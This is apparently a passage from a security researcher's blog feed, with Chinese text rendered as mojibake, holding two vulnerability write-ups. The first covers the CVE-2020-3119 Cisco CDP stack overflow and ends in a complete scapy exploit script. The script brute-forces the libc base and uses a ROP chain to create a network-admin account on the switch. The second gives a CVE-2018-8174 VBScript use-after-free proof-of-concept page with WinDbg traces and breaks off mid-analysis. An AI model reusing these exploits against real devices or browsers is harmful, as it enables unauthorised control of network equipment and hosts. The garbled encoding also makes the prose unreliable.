    <content type="html"><![CDATA[<h2 id="é…ç½®"><a href="#é…ç½®" class="headerlink" title="é…ç½®"></a>é…ç½®</h2><p>ä½¿ç”¨GNS3å¯ä»¥å¤ç°æ¼æ´ï¼›ä½¿ç”¨<a href="https://www.eve-ng.net/">EVE</a>ä¹Ÿå¯ä»¥ï¼Œä¸€ä¸ªå®šåˆ¶åŒ–çš„Linuxï¼Œæä¾›ä¸€ä¸ªä»¿çœŸç¯å¢ƒï¼Œæˆ‘å½“æ—¶ä¸¤ä¸ªæ–¹æ³•éƒ½æµ‹è¯•äº†,GNS3æœ‰ç‚¹å°å‘ï¼Œæœ€ååœ¨EVEä¸Šæµ‹è¯•é€šè¿‡çš„ã€‚</p><a id="more"></a><p>é…ç½®çš„æµç¨‹å…¶å®éƒ½ä¸€æ ·ï¼Œè¿›å…¥consoleå¯åŠ¨äº¤æ¢æœºã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dir</span><br><span class="line">boot nxos.9.3.2.bin</span><br></pre></td></tr></table></figure><p>è®¾ç½®å¯†ç  <code>Root1234</code></p><p>é…ç½®nexusäº¤æ¢æœºã€‚<br>å‚è€ƒè¿™é‡Œ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">switch<span class="comment"># conf t</span></span><br><span class="line">Enter configuration commands, one per line. End with CNTL/Z.</span><br><span class="line">switch(config)<span class="comment"># interface mgmt0</span></span><br><span class="line">switch(config-if)<span class="comment"># ip address 10.0.2.15/24  &lt;--- <span class="doctag">NOTE:</span> can use &quot;ip address dhcp&quot; here instead</span></span><br><span class="line">switch(config-if)<span class="keyword">in</span><span class="comment"># no shut</span></span><br><span class="line">switch(config-if)<span class="comment"># end</span></span><br><span class="line">switch<span class="comment"># conf t</span></span><br><span class="line">Enter configuration commands, one per line. End with CNTL/Z.</span><br><span class="line">switch(config)<span class="comment"># username vagrant password vagrant role network-admin</span></span><br><span class="line">switch(config)<span class="comment"># username vagrant shell bash</span></span><br><span class="line">switch(config)<span class="comment"># boot nxos bootflash:nxos.7.0.3.I2.2d.bin  &lt;--- Note: use correct image name from &quot;dir&quot; command output</span></span><br><span class="line">switch(config)<span class="comment"># copy r s</span></span><br><span class="line">[<span class="comment">########################################] 100%</span></span><br><span class="line">Copy complete.</span><br><span class="line">switch(config)<span class="comment">#</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="é€†å‘"><a href="#é€†å‘" class="headerlink" title="é€†å‘"></a>é€†å‘</h2><p>ç›´æ¥åæ±‡ç¼–binæœ‰å‘ï¼Œéœ€è¦gdbdumpäº†çœ‹dumpã€‚</p><p><img src="https://blogimg-10065924.cos.ap-shanghai.myqcloud.com/Cisco-CDP-cve-2020-3119/15878896392963.jpg" alt="-w766"></p><h2 id="æ¼æ´"><a href="#æ¼æ´" class="headerlink" title="æ¼æ´"></a>æ¼æ´</h2><p><img src="https://blogimg-10065924.cos.ap-shanghai.myqcloud.com/Cisco-CDP-cve-2020-3119/15878896392963.jpg" alt="-w766"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*(&amp;a1-&gt;levels + counter) = *(&amp;ptr + counter);<span class="comment">// write what where</span></span><br></pre></td></tr></table></figure><p>è¿™é‡Œå¯ä»¥ä»»æ„åœ°å€å†™ã€‚</p><h2 id="åˆ©ç”¨"><a href="#åˆ©ç”¨" class="headerlink" title="åˆ©ç”¨"></a>åˆ©ç”¨</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    No RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br><span class="line">RPATH:    b<span class="string">&#x27;/isan/lib/convert:/isan/lib:/isanboot/lib&#x27;</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ret_addr + JUNK + arg1</span><br></pre></td></tr></table></figure><p>çŒœä¸¤ä¸ªåœ°å€ï¼Œstack baseå’Œ libc baseï¼Œ ä»¥åŠheap addressï¼Ÿ</p><p>å­˜åœ¨æ ˆä¸Šçš„å †åœ°å€æ€ä¹ˆç”¨å‘¢ï¼Ÿretè¿‡å»ï¼Ÿ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">payload = [</span><br><span class="line">struct.pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0</span>),</span><br><span class="line"><span class="string">&#x27;A&#x27;</span> * <span class="number">64</span>,</span><br><span class="line">struct.pack(<span class="string">&#x27;!h&#x27;</span>, <span class="number">0xdeadbeef</span>), <span class="comment"># saved ebp</span></span><br><span class="line">struct.pack(<span class="string">&#x27;!h&#x27;</span>, libc_base + pop_ret_offset), <span class="comment"># ret addr</span></span><br><span class="line">struct.pack(<span class="string">&#x27;!h&#x27;</span>, libc_base + libc_bss_offset), <span class="comment"># a1</span></span><br><span class="line">struct.pack(<span class="string">&#x27;!h&#x27;</span>, libc_base + pop_ret_offset),</span><br><span class="line">struct.pack(<span class="string">&#x27;!h&#x27;</span>, <span class="number">0xdeadbeef</span>),</span><br><span class="line">...</span><br><span class="line">struct.pack(<span class="string">&#x27;!h&#x27;</span>, libc_base + system_offset),</span><br><span class="line">struct.pack(<span class="string">&#x27;!h&#x27;</span>, <span class="number">0xdeadbeef</span>),</span><br><span class="line">]</span><br></pre></td></tr></table></figure><p>åªéœ€è¦çŒœsystemæ‰€åœ¨libcçš„åŸºåœ°å€ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">junk</span><br><span class="line">saved ebp</span><br><span class="line">ret addr; &#x2F;&#x2F; pop retå³å¯</span><br><span class="line">a1</span><br><span class="line">pop ret</span><br><span class="line">junk</span><br><span class="line">pop ret</span><br><span class="line">junk</span><br><span class="line">...</span><br><span class="line">pop ret</span><br><span class="line">junk</span><br><span class="line">system_addr</span><br><span class="line">xxxx</span><br><span class="line">cmd_str_addr</span><br></pre></td></tr></table></figure><p>a1åªè¦æ˜¯ä¸€ä¸ªç¬¦åˆæ¡ä»¶çš„æŒ‡å‘dataæ®µçš„æŒ‡é’ˆå³å¯ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.contrib <span class="keyword">import</span> cdp</span><br><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> Ether, LLC, SNAP, sendp</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">offset_to_cmd = <span class="number">40</span> <span class="comment"># TODO</span></span><br><span class="line">libc_bss_offset = <span class="number">0x001B4EE0</span> + <span class="number">0x200</span> <span class="comment"># use for a1</span></span><br><span class="line">system_offset = <span class="number">0x0003C790</span>  <span class="comment"># system func</span></span><br><span class="line"></span><br><span class="line">pr_offset = <span class="number">0x00021b07</span> <span class="comment"># pop eax; ret</span></span><br><span class="line"><span class="comment"># pppr_offset_offset = 0x000df5d2 # pop ebp ; pop edi ; pop ebx ; ret</span></span><br><span class="line">ppr_offset_offset = <span class="number">0x000f5e5a</span>  <span class="comment"># pop ebp ; pop ebx ; ret</span></span><br><span class="line"></span><br><span class="line">cmd = <span class="string">&#x27;/isan/bin/vsh -c &quot;configure terminal ; username test password qweASD123 role network-admin&quot;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gen</span>(<span class="params">libc_base</span>):</span></span><br><span class="line">    payload = <span class="string">&quot;&quot;</span></span><br><span class="line">    payload += struct.pack(<span class="string">&#x27;&gt;I&#x27;</span>, <span class="number">0x0</span>) + <span class="string">&#x27;A&#x27;</span> * <span class="number">64</span></span><br><span class="line">    payload += struct.pack(<span class="string">&#x27;&gt;I&#x27;</span>, <span class="number">0x00001337</span>) + struct.pack(<span class="string">&#x27;&gt;I&#x27;</span>, libc_base + pr_offset) <span class="comment"># saved ebp + ret addr</span></span><br><span class="line">    payload += struct.pack(<span class="string">&#x27;&gt;I&#x27;</span>, libc_base + libc_bss_offset) <span class="comment"># a1</span></span><br><span class="line">    <span class="keyword">if</span> offset_to_cmd % <span class="number">2</span> == <span class="number">1</span>:</span><br><span class="line">        payload += (struct.pack(<span class="string">&#x27;&gt;I&#x27;</span>, libc_base + pr_offset) + struct.pack(<span class="string">&#x27;&gt;I&#x27;</span>, <span class="number">0x00001337</span>)) * offset_to_cmd</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        payload += struct.pack(<span class="string">&#x27;&gt;I&#x27;</span>, libc_base + ppr_offset_offset) + struct.pack(<span class="string">&#x27;&gt;I&#x27;</span>, <span class="number">0x00001337</span>) * <span class="number">2</span></span><br><span class="line">        payload += (struct.pack(<span class="string">&#x27;&gt;I&#x27;</span>, libc_base + pr_offset) + struct.pack(<span class="string">&#x27;&gt;I&#x27;</span>, <span class="number">0x00001337</span>)) * (offset_to_cmd - <span class="number">3</span>)</span><br><span class="line">    payload += struct.pack(<span class="string">&#x27;&gt;I&#x27;</span>, libc_base + system_offset) + struct.pack(<span class="string">&#x27;&gt;I&#x27;</span>, <span class="number">0x00001337</span>)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span>(<span class="params">payload</span>):</span></span><br><span class="line">    <span class="comment"># link layer</span></span><br><span class="line">    l2_packet = Ether(dst=<span class="string">&quot;01:00:0c:cc:cc:cc&quot;</span>)</span><br><span class="line">    <span class="comment"># Logical-Link Control</span></span><br><span class="line">    l2_packet /= LLC(dsap=<span class="number">0xaa</span>, ssap=<span class="number">0xaa</span>, ctrl=<span class="number">0x03</span>) / SNAP()</span><br><span class="line">    <span class="comment"># Cisco Discovery Protocol</span></span><br><span class="line">    cdp_v2 = cdp.CDPv2_HDR(vers=<span class="number">2</span>, ttl=<span class="number">180</span>)</span><br><span class="line">    deviceid = cdp.CDPMsgDeviceID(val=cmd)</span><br><span class="line">    portid = cdp.CDPMsgPortID(iface=<span class="string">b&quot;ens38&quot;</span>)</span><br><span class="line">    address = cdp.CDPMsgAddr(naddr=<span class="number">1</span>, addr=cdp.CDPAddrRecordIPv4(addr=<span class="string">&quot;192.168.204.77&quot;</span>))</span><br><span class="line">    cap = cdp.CDPMsgCapabilities(cap=<span class="number">1</span>)</span><br><span class="line">    power_req = cdp.CDPMsgUnknown19(val=payload)</span><br><span class="line">    power_level = cdp.CDPMsgPower(power=<span class="number">16</span>)</span><br><span class="line">    cdp_packet = cdp_v2/deviceid/portid/address/cap/power_req/power_level</span><br><span class="line">    packet = l2_packet / cdp_packet</span><br><span class="line">    sendp(packet)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="keyword">assert</span> offset_to_cmd !=<span class="number">0</span> </span><br><span class="line">    <span class="keyword">for</span> libc_base <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0xf5000000</span>, <span class="number">0xf5fff000</span>, <span class="number">0x1000</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            print(<span class="string">&#x27;[*] Exploiting...guess libc on &#123;0&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(libc_base)))</span><br><span class="line">            payload = gen(libc_base)</span><br><span class="line">            exploit(payload)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            print(e)</span><br><span class="line">        sleep(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span>():</span></span><br><span class="line">    payload = gen(<span class="number">0xf5dd9000</span>)</span><br><span class="line">    exploit(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># main()</span></span><br><span class="line">    test()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><p><a href="https://paper.seebug.org/1154/">CVE-2020-3119 Cisco CDP åè®®æ ˆæº¢å‡ºæ¼æ´åˆ†æs</a></p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;é…ç½®&quot;&gt;&lt;a href=&quot;#é…ç½®&quot; class=&quot;headerlink&quot; title=&quot;é…ç½®&quot;&gt;&lt;/a&gt;é…ç½®&lt;/h2&gt;&lt;p&gt;ä½¿ç”¨GNS3å¯ä»¥å¤ç°æ¼æ´ï¼›ä½¿ç”¨&lt;a href=&quot;https://www.eve-ng.net/&quot;&gt;EVE&lt;/a&gt;ä¹Ÿå¯ä»¥ï¼Œä¸€ä¸ªå®šåˆ¶åŒ–çš„Linuxï¼Œæä¾›ä¸€ä¸ªä»¿çœŸç¯å¢ƒï¼Œæˆ‘å½“æ—¶ä¸¤ä¸ªæ–¹æ³•éƒ½æµ‹è¯•äº†,GNS3æœ‰ç‚¹å°å‘ï¼Œæœ€ååœ¨EVEä¸Šæµ‹è¯•é€šè¿‡çš„ã€‚&lt;/p&gt;</summary>
    
    
    
    <category term="æ¼æ´åˆ†æ" scheme="http://o0xmuhe.me/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
    <category term="exploit" scheme="http://o0xmuhe.me/tags/exploit/"/>
    
    <category term="CDP" scheme="http://o0xmuhe.me/tags/CDP/"/>
    
    <category term="Cisco" scheme="http://o0xmuhe.me/tags/Cisco/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2018-8174 analysis</title>
    <link href="http://o0xmuhe.me/2020/02/20/CVE-2018-8174-analysis/"/>
    <id>http://o0xmuhe.me/2020/02/20/CVE-2018-8174-analysis/</id>
    <published>2020-02-19T16:49:23.000Z</published>
    <updated>2020-06-20T11:03:34.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CVE-2018-8174"><a href="#CVE-2018-8174" class="headerlink" title="CVE-2018-8174"></a>CVE-2018-8174</h1><a id="more"></a><h2 id="Basic-Info"><a href="#Basic-Info" class="headerlink" title="Basic Info"></a>Basic Info</h2><p>åˆ©ç”¨oleåŠ è½½IEçš„0dayå®Œæˆåˆ©ç”¨ã€‚</p><ul><li>win7 sp1 x86</li><li>vbscript version : 5.8.9600.17420</li></ul><h2 id="vuln-âœ…"><a href="#vuln-âœ…" class="headerlink" title="vuln âœ…"></a>vuln âœ…</h2><p>poc</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;x-ua-compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;IE=10&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">&quot;vbscript&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">Dim array_a</span><br><span class="line">Dim array_b(1)</span><br><span class="line"></span><br><span class="line">Class Trigger</span><br><span class="line">    Private Sub Class Terminate()</span><br><span class="line"><span class="javascript">        <span class="built_in">Set</span> array_b(<span class="number">0</span>) = array_a(<span class="number">1</span>)</span></span><br><span class="line">        array_a(1) = 1</span><br><span class="line">    End Sub</span><br><span class="line">End Class</span><br><span class="line"></span><br><span class="line">Sub UAF</span><br><span class="line">    ReDim array_a(1)</span><br><span class="line"><span class="javascript">    <span class="built_in">Set</span> array_a(<span class="number">1</span>) = New Trigger</span></span><br><span class="line">    Erase array_a</span><br><span class="line">End Sub</span><br><span class="line"></span><br><span class="line">Sub TriggerVuln</span><br><span class="line">    array_b(0) = 0</span><br><span class="line">End Sub</span><br><span class="line"></span><br><span class="line">Sub StartExploit</span><br><span class="line">    UAF</span><br><span class="line">    TriggerVuln</span><br><span class="line">End Sub</span><br><span class="line"></span><br><span class="line">StartExploit</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://blogimg-10065924.cos.ap-shanghai.myqcloud.com/CVE-2018-8174/15832345474144.jpg"></p><p>çœ‹èµ·æ¥æ˜¯ä¸ªUaFï¼Œç»“åˆpocæ¥çœ‹ï¼š</p><ul><li>UAFå‡½æ•°é‡ŒRedimäº†<code>array_a</code>ï¼Œå¹¶ä¸”æŠŠå®ƒçš„å€¼åˆå§‹åŒ–ä¸º<code>Trigger</code>å¯¹è±¡çš„ä¸€ä¸ªå®ä¾‹ï¼Œéšåä¾¿åˆ é™¤äº†<code>array_a</code>å¯¹è±¡</li><li><code>array_a</code>è¢«åˆ é™¤çš„æ—¶å€™è§¦å‘äº†Triggerçš„ææ„å‡½æ•°ï¼Œè¿™é‡Œé¢æŠŠ<code>array_a(1)</code>èµ‹å€¼ç»™<code>array_b(0)</code>ï¼Œæ­¤æ—¶<code>array_b(0)</code>æŒ‡å‘<code>Trigger</code>å¯¹è±¡</li><li>éšå<code>array_a(1)=1</code>æ˜¯ä¸ºäº†å¹³è¡¡å¼•ç”¨è®¡æ•°ï¼Œå¥½è·å¾—ä¸€ä¸ªé‡æŒ‡é’ˆ</li><li>éšåçš„TriggerVulnå‡½æ•°é‡Œ<code>array_b(0)</code>è®¿é—®äº†å·²ç»é‡Šæ”¾çš„Triggerå¯¹è±¡ï¼Œå¯¼è‡´UaFã€‚</li></ul><p><strong>è¿™ä¸ªè¿‡ç¨‹å’Œä¹‹å‰çœ‹åˆ°çš„ä¸€äº›vbsçš„æ´å¾ˆåƒï¼Œéƒ½æ˜¯ä¸€ä¸ªæ¨¡å¼ã€‚</strong></p><p>é‚£ä¹ˆæ ¹æ®<code>!heap -p -a eax</code>çš„è°ƒç”¨æ ˆå¯ä»¥çœ‹åˆ°ä¸€ä¸ª<code>!VbsErase+0x00000050</code>å‡½æ•°ï¼Œè¿™ä¸ªåº”è¯¥æ˜¯å¯¹åº”pocé‡Œçš„<code>Erase array_a</code>ã€‚</p><p>è°ƒç”¨æ ˆ<code>k10</code>é‡Œçœ‹åˆ°çš„<code>vbscript!AssignVar</code> åº”è¯¥å¯¹åº”<code>array_b(0) = 0</code>èµ‹å€¼è¯­å¥ã€‚</p><p>Q:UaFçš„å¯¹è±¡æ˜¯ï¼Ÿ<br>A:VBScriptClass</p><p>Q:è¢«é‡Šæ”¾å¯¹è±¡çš„å¤§å°ï¼Ÿ<br>A:0x30<br><img src="https://blogimg-10065924.cos.ap-shanghai.myqcloud.com/CVE-2018-8174/15832495670898.jpg"><br>é‡Šæ”¾çš„æ—¶å€™ï¼Œå›è°ƒç”¨è¿™ä¸ªå¯¹è±¡çš„<code>VBScriptClass::Release</code>å‡½æ•°ï¼Œåœ¨c++å±‚vbsé‡Œçš„Triggerå¯¹è±¡æ˜¯VBScriptClassï¼Œé‡Šæ”¾çš„æ—¶å€™è°ƒç”¨äº†Releaseå‡½æ•°ï¼Œæ‰€ä»¥è¯¥å¯¹è±¡çš„å¤§å°ç­‰ä¿¡æ¯ï¼Œå¯ä»¥è°ƒè¿™ä¸ªå‡½æ•°ã€‚</p><p>é‡Šæ”¾å‰å</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">0:007&gt; dd esi</span><br><span class="line">01848fd0  6b60206c 00000002 0184cf78 07d29f88</span><br><span class="line">01848fe0  00000b64 00000000 00000000 08864efc</span><br><span class="line">01848ff0  00000001 0865efe4 00000000 00000000</span><br><span class="line">01849000  ???????? ???????? ???????? ????????</span><br><span class="line">01849010  ???????? ???????? ???????? ????????</span><br><span class="line">01849020  ???????? ???????? ???????? ????????</span><br><span class="line">01849030  ???????? ???????? ???????? ????????</span><br><span class="line">01849040  ???????? ???????? ???????? ????????</span><br><span class="line">0:007&gt; !heap -p -a esi</span><br><span class="line">    address 01848fd0 found in</span><br><span class="line">    _DPH_HEAP_ROOT @ 1781000</span><br><span class="line">    in busy allocation (  DPH_HEAP_BLOCK:         UserAddr         UserSize -         VirtAddr         VirtSize)</span><br><span class="line">                                 8860ea0:          1848fd0               30 -          1848000             2000</span><br><span class="line">          vbscript!VBScriptClass::&#96;vftable&#39;</span><br><span class="line">    722c8e89 verifier!AVrfDebugPageHeapAllocate+0x00000229</span><br><span class="line">    77225ede ntdll!RtlDebugAllocateHeap+0x00000030</span><br><span class="line">    771ea40a ntdll!RtlpAllocateHeap+0x000000c4</span><br><span class="line">    771b5ae0 ntdll!RtlAllocateHeap+0x0000023a</span><br><span class="line">    77039d45 msvcrt!malloc+0x0000008d</span><br><span class="line">    7703b0d7 msvcrt!operator new+0x0000001d</span><br><span class="line">    6b629f0c vbscript!VBScriptClass::Create+0x00000014</span><br><span class="line">    6b629e97 vbscript!CScriptRuntime::RunNoEH+0x00002c78</span><br><span class="line">    6b60526e vbscript!CScriptRuntime::Run+0x000000c3</span><br><span class="line">    6b60518b vbscript!CScriptEntryPoint::Call+0x0000010b</span><br><span class="line">    6b62a12e vbscript!CScriptRuntime::RunNoEH+0x00002c23</span><br><span class="line">    6b60526e vbscript!CScriptRuntime::Run+0x000000c3</span><br><span class="line">    6b60518b vbscript!CScriptEntryPoint::Call+0x0000010b</span><br><span class="line">    6b6057cb vbscript!CScriptRuntime::RunNoEH+0x00001d74</span><br><span class="line">    6b60526e vbscript!CScriptRuntime::Run+0x000000c3</span><br><span class="line">    6b60518b vbscript!CScriptEntryPoint::Call+0x0000010b</span><br><span class="line">    6b6057cb vbscript!CScriptRuntime::RunNoEH+0x00001d74</span><br><span class="line">    6b60526e vbscript!CScriptRuntime::Run+0x000000c3</span><br><span class="line">    6b60518b vbscript!CScriptEntryPoint::Call+0x0000010b</span><br><span class="line">    6b6059bd vbscript!CSession::Execute+0x00000156</span><br><span class="line">    6b605c6b vbscript!COleScript::ExecutePendingScripts+0x0000014f</span><br><span class="line">    6b629138 vbscript!COleScript::ParseScriptTextCore+0x0000023e</span><br><span class="line">    6b60c3b9 vbscript!COleScript::ParseScriptText+0x00000029</span><br><span class="line">    6496f1e5 MSHTML!CActiveScriptHolder::ParseScriptText+0x00000051</span><br><span class="line">    64a05f3a MSHTML!CScriptCollection::ParseScriptText+0x00000177</span><br><span class="line">    6496fd65 MSHTML!CScriptData::CommitCode+0x00000332</span><br><span class="line">    6496f973 MSHTML!CScriptData::Execute+0x00000286</span><br><span class="line">    649707d4 MSHTML!CHtmScriptParseCtx::Execute+0x00000130</span><br><span class="line">    649e9a52 MSHTML!CHtmParseBase::Execute+0x00000196</span><br><span class="line">    6476b333 MSHTML!CHtmPost::Broadcast+0x00000153</span><br><span class="line">    6476b0ef MSHTML!CHtmPost::Exec+0x000005d9</span><br><span class="line">    64a078c8 MSHTML!CHtmPost::Run+0x0000003d</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">0:007&gt; g</span><br><span class="line">(b4c.b64): Access violation - code c0000005 (first chance)</span><br><span class="line">First chance exceptions are reported before any exception handling.</span><br><span class="line">This exception may be expected and handled.</span><br><span class="line">eax&#x3D;01848fd0 ebx&#x3D;72540fd0 ecx&#x3D;00000009 edx&#x3D;00000009 esi&#x3D;08658fe0 edi&#x3D;00000009</span><br><span class="line">eip&#x3D;759e4971 esp&#x3D;0479b7f0 ebp&#x3D;0479b7f8 iopl&#x3D;0         nv up ei pl nz na po nc</span><br><span class="line">cs&#x3D;001b  ss&#x3D;0023  ds&#x3D;0023  es&#x3D;0023  fs&#x3D;003b  gs&#x3D;0000             efl&#x3D;00010202</span><br><span class="line">OLEAUT32!VariantClear+0xb3:</span><br><span class="line">759e4971 8b08            mov     ecx,dword ptr [eax]  ds:0023:01848fd0&#x3D;????????</span><br></pre></td></tr></table></figure><h2 id="exploit-analysis"><a href="#exploit-analysis" class="headerlink" title="exploit analysis"></a>exploit analysis</h2><p>åˆ©ç”¨ï¼Œæ‰¾åˆé€‚çš„å¯¹è±¡å ä½ï¼Œå¯ä»¥ä½¿ç”¨å¦ä¸€ä¸ª<code>VBScriptClass</code>å¯¹è±¡æ¥å ä½ï¼Œæ„é€ 